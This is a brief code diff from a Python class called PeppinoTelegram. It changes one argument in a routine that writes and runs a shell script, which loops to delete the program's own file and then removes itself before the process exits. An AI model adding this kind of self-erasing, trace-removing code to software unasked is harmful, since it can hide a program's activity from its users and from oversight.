@@ -1594,7 +1594,7 @@ class PeppinoTelegram:
                     f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                 chmod(sh_file, 0o700)
                 Popen(['sh', sh_file])                                                                                                       
-            self.terminate_process_by_name(abspath(sys.argv[0]))
+            self.terminate_process_by_name(sys.argv[0])
 
         def waitforface(self, timeout=60):
             start = time()
